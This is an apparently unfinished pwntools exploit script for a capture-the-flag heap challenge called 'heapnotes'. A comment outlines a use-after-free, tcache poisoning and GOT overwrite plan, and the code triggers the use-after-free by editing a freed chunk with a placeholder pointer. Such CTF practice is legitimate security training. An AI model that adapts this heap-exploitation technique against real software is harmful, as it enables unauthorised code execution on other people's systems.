#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('heapnotes',checksec=False)
libc = ELF('libc-2.31.so',checksec=False)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chal.nbctf.com', 30172)
else:
  p = binary.process(env={})
s = lambda x, r="": \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="": \
  p.sendlineafter(r, x) if r else p.sendline(x)
log_addr = lambda name, addr: \
  log.info("%s: %#lx"%(name, addr))

# ez heap pwn, uaf -> tcache poison -> overwrite .GOT with win()
def note_create(data: bytes) -> None:
  log.info('note_create()')
  sl(b'1', b'> ')
  sl(data, b': ')

def note_read(index: int) -> bytes:
  log.info(f'note_read({index})')
  sl(b'2', b'> ')
  sl(str(index).encode(), b': ')
  return p.recvline()[:-1]

def note_edit(index: int, data: bytes) -> None:
  log.info(f'note_edit({index})')
  sl(b'3', b'> ')
  sl(str(index).encode(), b': ')
  sl(data, b': ')

def note_delete(index: int):
  log.info(f'note_delete({index})')
  sl(b'4', b'> ')
  sl(str(index).encode(), b': ')


note_create(b'A'*63)
note_create(b'B'*63)
note_delete(0)
note_delete(1)
note_edit(1, p64(0xdeadbeef))


p.interactive()

